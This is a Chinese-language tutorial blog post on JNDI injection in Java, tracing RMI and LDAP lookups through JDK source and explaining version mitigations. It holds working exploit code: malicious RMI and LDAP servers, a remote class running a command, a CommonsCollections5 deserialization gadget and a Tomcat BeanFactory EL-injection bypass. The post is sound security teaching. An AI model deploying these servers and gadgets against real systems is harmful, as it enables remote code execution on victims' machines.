---
title: javasec（八）jndi注入
tags:
  - java
  - javasec
  - websec
  - Redteam
categories:
  - javasec
  - java
cover: 'https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/1.jpeg'
feature: false
date: 2023-04-22 16:38:27
---

z

这篇文章介绍jndi注入。

<!--More-->

# JNDI

JNDI（全称**Java Naming and Directory Interface**）是用于目录服务的Java API，它允许Java客户端通过名称发现和查找数据和资源(以Java对象的形式)。与主机系统接口的所有Java api一样，JNDI独立于底层实现。此外，它指定了一个服务提供者接口(SPI)，该接口允许将目录服务实现插入到框架中。通过JNDI查询的信息可能由服务器、文件或数据库提供，选择取决于所使用的实现。

# 前置知识

## InitialContext类

### 构造方法：

```java
InitialContext() 
构建一个初始上下文。  
InitialContext(boolean lazy) 
构造一个初始上下文，并选择不初始化它。  
InitialContext(Hashtable<?,?> environment) 
使用提供的环境构建初始上下文。
```

代码：

InitialContext initialContext = new InitialContext();

在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。

### 常用方法：

```java
bind(Name name, Object obj) 
将名称绑定到对象。 
list(String name) 
枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。
lookup(String name) 
检索命名对象。 
rebind(String name, Object obj) 
将名称绑定到对象，覆盖任何现有绑定。 
unbind(String name) 
取消绑定命名对象。
```

代码：

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class jndi {
    public static void main(String[] args) throws NamingException {
        String uri = "rmi://127.0.0.1:1099/work";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(uri);
    }
}
```

## Reference类

该类也是在javax.naming的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。

### 构造方法：

```java
Reference(String className) 
为类名为“className”的对象构造一个新的引用。  
Reference(String className, RefAddr addr) 
为类名为“className”的对象和地址构造一个新引用。  
Reference(String className, RefAddr addr, String factory, String factoryLocation) 
为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  
Reference(String className, String factory, String factoryLocation) 
为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。
```

代码：

```java
String url = "http://127.0.0.1:8080";
Reference reference = new Reference("test", "test", url);
```

参数1：className – 远程加载时所使用的类名

参数2：Factory – 加载的class中需要实例化类的名称

参数3：FactoryLocation – 提供classes数据的地址可以是**file/ftp/http****协议**

### 常用方法：

```java
void add(int posn, RefAddr addr) 
将地址添加到索引posn的地址列表中。  
void add(RefAddr addr) 
将地址添加到地址列表的末尾。  
void clear() 
从此引用中删除所有地址。  
RefAddr get(int posn) 
检索索引posn上的地址。  
RefAddr get(String addrType) 
检索地址类型为“addrType”的第一个地址。  
Enumeration<RefAddr> getAll() 
检索本参考文献中地址的列举。  
String getClassName() 
检索引用引用的对象的类名。  
String getFactoryClassLocation() 
检索此引用引用的对象的工厂位置。  
String getFactoryClassName() 
检索此引用引用对象的工厂的类名。    
Object remove(int posn) 
从地址列表中删除索引posn上的地址。  
int size() 
检索此引用中的地址数。  
String toString() 
生成此引用的字符串表示形式。
```



# JNDI注入简介

JNDI注入通俗的来讲就是当url值可控的时候,也就是在JNDI接口初始化`InitialContext.lookup(URL)`引发的漏洞,导致可以远程加载恶意class文件,造成的远程代码执行

## **jndi注入的利用条件**

- **客户端的lookup()方法的参数可控**
- **服务端在使用Reference时，**Reference(String className, String factory, String factoryLocation)中，**factoryLocation参数可控/可利用**

上面两个都是在编写程序时可能存在的脆弱点（**任意一个满足就行**），除此之外，jdk版本在jndi注入中也起着至关重要的作用，而且不同的攻击对jdk的版本要求也不一致，这里就全部列出来：

- JDK 5 U45,JDK 6 U45,JDK 7u21,JDK 8u121开始：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性
- JDK 6u141、7u131、8u121开始：增加了com.sun.jndi.**rmi**.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击
- JDK 6u211、7u201、8u191开始：增加了com.sun.jndi.**ldap**.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了

## RMI+JNDI(这里使用的实验环境是8u74)

RMI+JNDI注入就是将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行

**javax.naming.Reference**构造方法为：Reference(String className, String factory, String factoryLocation)，

1. className - 远程加载时所使用的类名
2. classFactory - 加载的class中需要实例化类的名称
3. classFactoryLocation - 提供classes数据的地址可以是file/ftp/http等协议

因为Reference没有实现Remote接口也没有继承UnicastRemoteObject类，故不能作为远程对象bind到注册中心，所以需要使用ReferenceWrapper对Reference的实例进行一个封装。

服务端代码如下：

```java
//server.java
package JNDI;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class server {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        String url = "http://127.0.0.1:8081/";
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("test", "test", url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("obj",referenceWrapper);
        System.out.println("running");
    }
}
```

恶意代码（test.class），将其编译好放到可访问的http服务器（这里实验就放在了本地，用python3启一个web服务即可）

注意，这里不要弄成main方法了,应该构造一个显示的构造函数来放置恶意代码才会执行

并且这个恶意类不要加包名,而且不要和服务端还有客户端放在同一个目录,否则在启动客户端的时候会直接从当前目录下寻找到这个class文件,不启动web服务也能成功。

```java
//test.java
public class test {
    public test() throws Exception{
        Runtime.getRuntime().exec("calc");
    }
}
```

接下来编译出class文件,放在本地web目录即可(**这里注意，如果使用上述python命令启动的web服务，那么你在哪个目录下打开cmd窗口启动的服务，你的web目录就在哪个目录**)

```java
编译:javac test.java
部署在web服务上：python3 -m http.server 8081 #端口根据前面服务端url的端口
```

当客户端通过InitialContext().lookup("rmi://127.0.0.1:8081/obj")获取远程对象时，会执行我们的恶意代码

```java
//client.java
package JNDI;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class client {
    public static void main(String[] args) throws NamingException {
        String url = "rmi://localhost:1099/obj";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(url);
    }
}
```

![img](https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304221640222.png)

#### 调用栈

```java
getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)
getObjectInstance:319, NamingManager (javax.naming.spi)
//以上获取信息
decodeObject:456, RegistryContext (com.sun.jndi.rmi.registry)
lookup:120, RegistryContext (com.sun.jndi.rmi.registry)
lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:411, InitialContext (javax.naming)
main:7, JNDI_Test (demo)
```

跟进InitialContext.java的lookup方法

![img](https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304221640034.png)

getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，因为InitialContext是实现了Context接口的类,此处返回Context对象的子类rmiURLContext对象

接下来就是到对应协议中去lookup搜寻,继续跟进lookup方法

GenericURLContext.java

```java
//传入的var1="rmi://127.0.0.1/obj"
public Object lookup(String var1) throws NamingException {
    //此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址
    //当然,不同的协议调用这个函数的时候会根据getURLOrDefaultInitCtx函数返回的对象调用不同的            
    //getRootURLContext,从而进入不同的协议路线

    ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);//获取RMI注册中心相关数据
    Context var3 = (Context)var2.getResolvedObj();//获取注册中心对象

    Object var4;
    try {
        var4 = var3.lookup(var2.getRemainingName());//到相应的注册中心去调用lookup函数
    } finally {
        var3.close();
    }

    return var4;
}
```

因为传入的var1="rmi://127.0.0.1/obj",所以调用lookup的时候,var2.getRemainingName="obj"

继续跟进lookup

RegistryContext.java

```java
//传入的var1="obj"
public Object lookup(Name var1) throws NamingException {
    if (var1.isEmpty()) {
        return new RegistryContext(this);
    } else {
        Remote var2;
        try {
            var2 = this.registry.lookup(var1.get(0));
        } catch (NotBoundException var4) {
            throw new NameNotFoundException(var1.get(0));
        } catch (RemoteException var5) {
            throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
        }

        return this.decodeObject(var2, var1.getPrefix(1));
    }
}
```

![img](https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304221640123.png)很明显进入了else分支,var2 = this.registry.lookup(var1.get(0));在这里RMI客户端与注册中心通信,返回RMI的服务IP,地址等信息

前面的那几步是获取上下文信息的,跟进com.sun.jndi.rmi.registry.RegistryContext#decodeObject，这里是将从服务端返回的ReferenceWrapper_Stub获取Reference对象。

```java
private Object decodeObject(Remote var1, Name var2) throws NamingException {
    try {
        Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
        return NamingManager.getObjectInstance(var3, var2, this, this.environment);
    } catch (NamingException var5) {
        throw var5;
    } catch (RemoteException var6) {
        throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
    } catch (Exception var7) {
        NamingException var4 = new NamingException();
        var4.setRootCause(var7);
        throw var4;
    }
}
```

跟进javax.naming.spi.NamingManager#getObjectInstance，此处为获取Factory类的实例。

```java
public static Object
    getObjectInstance(Object refInfo, Name name, Context nameCtx,
                      Hashtable<?,?> environment)
    throws Exception
{

    ObjectFactory factory;

    //省略部分代码

    Object answer;

    if (ref != null) {
        String f = ref.getFactoryClassName();
        if (f != null) {
            // if reference identifies a factory, use exclusively

            factory = getObjectFactoryFromReference(ref, f);
            if (factory != null) {
                return factory.getObjectInstance(ref, name, nameCtx,
                                                 environment);
            }
            // No factory found, so return original refInfo.
            // Will reach this point if factory class is not in
            // class path and reference does not contain a URL for it
            return refInfo;

        } else {
            // if reference has no factory, check for addresses
            // containing URLs

            answer = processURLAddrs(ref, name, nameCtx, environment);
            if (answer != null) {
                return answer;
            }
        }
    }

    // try using any specified factories
    answer =
        createObjectFromFactories(refInfo, name, nameCtx, environment);
    return (answer != null) ? answer : refInfo;
}
```

 跟进javax.naming.spi.NamingManager#getObjectFactoryFromReference，此处clas = helper.loadClass(factoryName);尝试从本地加载Factory类，如果不存在本地不存在此类，则会从codebase中加载：clas = helper.loadClass(factoryName, codebase);会从远程加载我们恶意class，**然后在return那里return (clas != null) ? (ObjectFactory) clas.newInstance() : null;对我们的恶意类进行一个实例化，进而加载我们的恶意代码,构造函数执行命令。**  

![img](https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304221640171.png)

具体看一下com.sun.naming.internal.VersionHelper12#loadClass代码如下，可以看到他是通过URLClassLoader从远程动态加载实例化我们的恶意类。

![img](https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304221640280.png)

对于这种利用方式Java在其JDK 6u132、7u122、8u113中进行了限制，com.sun.jndi.rmi.object.trustURLCodebase默认值变为false

```java
static {
    PrivilegedAction var0 = () -> {
        return System.getProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");
    };
    String var1 = (String)AccessController.doPrivileged(var0);
    trustURLCodebase = "true".equalsIgnoreCase(var1);
}
```

如果从远程加载则会抛出异常

```java
if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) {
    throw new ConfigurationException("The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.");
}
Exception in thread "main" javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495)
at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)
at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
at javax.naming.InitialContext.lookup(InitialContext.java:417)
at demo.JNDI_Test.main(JNDI_Test.java:7)
```

## LDAP+JNDI

LDAP，全称Lightweight Directory Access Protocol，即**轻量级目录访问协议**，和Windows域中的LDAP概念差不多，这里就不进行过多展开了。

### JDK < 8u191

我们在上面讲了在JDK 6u132, JDK 7u122, JDK 8u113中Java限制了通过RMI远程加载Reference工厂类，com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为了false，即默认不允许通过RMI从远程的Codebase加载Reference工厂类。

但是需要注意的是JNDI不仅可以从通过RMI加载远程的Reference工厂类，也可以通过LDAP协议加载远程的Reference工厂类，这就可以加以利用，来绕过限制.

但可惜的是在之后的版本Java也对LDAP Reference远程加载Factory类进行了限制，在JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase属性的值默认值也变为false，对应的CVE编号为：**CVE-2018-3149**

服务端maven需要添加如下依赖：

```java
<dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>4.0.0</version>
</dependency>
```

**服务端ldap_server.java**

```java
package JNDI;

import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class ldap_sever {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) {
        String[] args=new String[]{"http://127.0.0.1:8081/#test"};
        int port = 7777;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```



**客户端ldap_client.java**

```java
package JNDI;

import javax.naming.InitialContext;

public class ldap_client {
    public static void main(String[] args) throws Exception{
        Object object=new InitialContext().lookup("ldap://127.0.0.1:7777/calc");
    }
}
```

![img](https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304221640072.png)

#### 调用栈

```java
getObjectFactoryFromReference:142, NamingManager (javax.naming.spi)
getObjectInstance:189, DirectoryManager (javax.naming.spi)
c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
main:7, ldap_client (JNDI)
```

其调用和RMI差不多，只不过LDAP前面多几步加载上下文的调用，其核心还是通过Reference加载远程的Factory类，最终调用也是RMI一样javax.naming.spi.NamingManager#getObjectFactoryFromReference

```java
static ObjectFactory getObjectFactoryFromReference(
    Reference ref, String factoryName)
    throws IllegalAccessException,
    InstantiationException,
    MalformedURLException {
    Class<?> clas = null;

    // Try to use current class loader
    try {
         clas = helper.loadClass(factoryName);
    } catch (ClassNotFoundException e) {
        // ignore and continue
        // e.printStackTrace();
    }
    // All other exceptions are passed up.

    // Not in class path; try to use codebase
    String codebase;
    if (clas == null &&
            (codebase = ref.getFactoryClassLocation()) != null) {
        try {
            clas = helper.loadClass(factoryName, codebase);
        } catch (ClassNotFoundException e) {
        }
    }

    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
}
```

该利用方法在JDK 11.0.1、8u191、7u201、6u211中也进行了修复， com.sun.jndi.ldap.object.trustURLCodebase属性的值默认为false

```java
private static final String TRUST_URL_CODEBASE_PROPERTY =
        "com.sun.jndi.ldap.object.trustURLCodebase";

private static final String trustURLCodebase =
        AccessController.doPrivileged(
            new PrivilegedAction<String>() {
                public String run() {
                    try {
                    return System.getProperty(TRUST_URL_CODEBASE_PROPERTY,
                        "false");
                    } catch (SecurityException e) {
                    return "false";
                    }
                }
            }
        );
```

如果trustURLCodebase为false则直接返回null

```java
public Class<?> loadClass(String className, String codebase)
        throws ClassNotFoundException, MalformedURLException {
    if ("true".equalsIgnoreCase(trustURLCodebase)) {
        ClassLoader parent = getContextClassLoader();
        ClassLoader cl =
                URLClassLoader.newInstance(getUrlArray(codebase), parent);

        return loadClass(className, cl);
    } else {
        return null;
    }
}
```

### JDK >= 8u191

关于JDK >= 8u191的利用目前公开有两种绕过的方法，**这里测试的JDK版本为JDK 8u201**

```java
两种绕过⽅法如下： 

1、找到⼀个受害者本地 CLASSPATH 中的类作为恶意的 Reference Factory 工厂类, 并利用这个本地的 Factory 类执行命令. 

2、利⽤ LDAP 直接返回⼀个恶意的序列化对象, JNDI 注⼊依然会对该对象进⾏反序列化操作, 利用反序列化 Gadget 完成命令执行. 
这两种⽅式都依赖受害者本地 CLASSPATH 中环境, 需要利⽤受害者本地的 Gadget 进行攻击
```

#### 通过反序列化

通过反序列化，那么前提是客户端得有可用的Gadgets

服务端参考marshalsec.jndi.LDAPRefServer，简单修改一下即可，这里使用的Gadget是**CommonsCollections5**

```java
package JNDI;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class ldap_server191 {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) throws Exception{
        String[] args=new String[]{"http://127.0.0.1/#test"};
        int port = 7777;

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", //$NON-NLS-1$
                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
        ds.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }

            e.addAttribute("javaSerializedData",CommonsCollections5());

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

    private static byte[] CommonsCollections5() throws Exception{
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
        Map map=new HashMap();
        Map lazyMap=LazyMap.decorate(map,chainedTransformer);
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test");
        BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
        Field field=badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,tiedMapEntry);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(badAttributeValueExpException);
        objectOutputStream.close();

        return byteArrayOutputStream.toByteArray();
    }

}
```

客户端

```java
package JNDI;

import javax.naming.InitialContext;

public class ldap_client191 {
    public static void main(String[] args) throws Exception{
        Object object=new InitialContext().lookup("ldap://127.0.0.1:7777/calc");
    }
}
```

调用栈如下：

```java
deserializeObject:532, Obj (com.sun.jndi.ldap)
decodeObject:239, Obj (com.sun.jndi.ldap)
c_lookup:1051, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
main:7, ldap_client191(JNDI)
```

跟进com.sun.jndi.ldap.Obj#decodeObject

```java
static Object decodeObject(Attributes var0) throws NamingException {
    String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));

    try {
        Attribute var1;
        if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
            ClassLoader var3 = helper.getURLClassLoader(var2);
            return deserializeObject((byte[])((byte[])var1.get()), var3);
        } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
            return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);
        } else {
            var1 = var0.get(JAVA_ATTRIBUTES[0]);
            return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) && !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
        }
    } catch (IOException var5) {
        NamingException var4 = new NamingException();
        var4.setRootCause(var5);
        throw var4;
    }
}
```

此处(var1 = var0.get(JAVA_ATTRIBUTES[1])) != null判断JAVA_ATTRIBUTES[1]是否为空，如果不为空则进入deserializeObject进行反序列操作

其中JAVA_ATTRIBUTES在com.sun.jndi.ldap.Obj中定义为

```java
static final String[] JAVA_ATTRIBUTES = new String[]{"objectClass", "javaSerializedData", "javaClassName", "javaFactory", "javaCodeBase", "javaReferenceAddress", "javaClassNames", "javaRemoteLocation"};
```

**JAVA_ATTRIBUTES[1]**为**javaSerializedData**，**所以我们可以LDAP修改javaSerializedData为我们的恶意序列化数据，然后客户端进行反序列化进而到达RCE。**

跟进com.sun.jndi.ldap.Obj#deserializeObject，可以看到**var5 = ((ObjectInputStream)var20).readObject();**此处对var20（也就是从javaSerializedData中读取的序列化数据）进行了反序列化

```java
private static Object deserializeObject(byte[] var0, ClassLoader var1) throws NamingException {
    try {
        ByteArrayInputStream var2 = new ByteArrayInputStream(var0);

        try {
            Object var20 = var1 == null ? new ObjectInputStream(var2) : new Obj.LoaderInputStream(var2, var1);
            Throwable var21 = null;

            Object var5;
            try {
                var5 = ((ObjectInputStream)var20).readObject();
            } catch (Throwable var16) {
                var21 = var16;
                throw var16;
            } finally {
                if (var20 != null) {
                    if (var21 != null) {
                        try {
                            ((ObjectInputStream)var20).close();
                        } catch (Throwable var15) {
                            var21.addSuppressed(var15);
                        }
                    } else {
                        ((ObjectInputStream)var20).close();
                    }
                }

            }

            return var5;
        } catch (ClassNotFoundException var18) {
            NamingException var4 = new NamingException();
            var4.setRootCause(var18);
            throw var4;
        }
    } catch (IOException var19) {
        NamingException var3 = new NamingException();
        var3.setRootCause(var19);
        throw var3;
    }
}
```

服务端代码可以参考marshalsec，然后添加对应属性javaSerializedData为我们的Gadgets序列化的数据即可

```java
e.addAttribute("javaSerializedData", GadgetsData);
```

#### 通过加载本地类

之前在分析RMI的时候提到过在加载远程类之前,会先加载本地类

在JDK 11.0.1、8u191、7u201、6u211之后之后com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值为false，我们就不能再从远程的Codebase加载恶意的Factory类了,那假如加载的是本地类呢

需要注意的，该工厂类型必须实现**javax.naming.spi.ObjectFactory** 接口，因为在javax.naming.spi.NamingManager#getObjectFactoryFromReference最后的return语句对工厂类的实例对象进行了类型转换return (clas != null) ? (ObjectFactory) clas.newInstance() : null;；并且该工厂类至少存在一个 getObjectInstance() 方法才能在前面调用

（[这篇文章](https://xz.aliyun.com/t/[https://www.veracode.com/blog/research/exploiting-jndi-injections-java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java))的作者找到可利用的类为：**org.apache.naming.factory.BeanFactory**，并且该类存在于Tomcat依赖包中，所以利用范围还是比较广泛的。

添加如下依赖：

```java
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.0</version>
</dependency>

<dependency>
    <groupId>org.apache.el</groupId>
    <artifactId>com.springsource.org.apache.el</artifactId>
    <version>7.0.26</version>
</dependency>
```

服务端代码参考自[这篇文章](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)

```java
package JNDI;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class jndi_sever_rmi_local {

    public static void main(String[] args) throws Exception{

        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);

        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);

    }
}
```

客户端

```java
package JNDI;

import javax.naming.InitialContext;

public class jndi_client_rmi_local {
    public static void main(String[] args) throws Exception{
        Object object=new InitialContext().lookup("rmi://127.0.0.1:1097/Object");
    }
}
```

##### 调用栈：

```java
getObjectInstance:123, BeanFactory (org.apache.naming.factory)
getObjectInstance:321, NamingManager (javax.naming.spi)
decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:417, InitialContext (javax.naming)
main:9, jndi_client_rmi_local (JNDI)
```

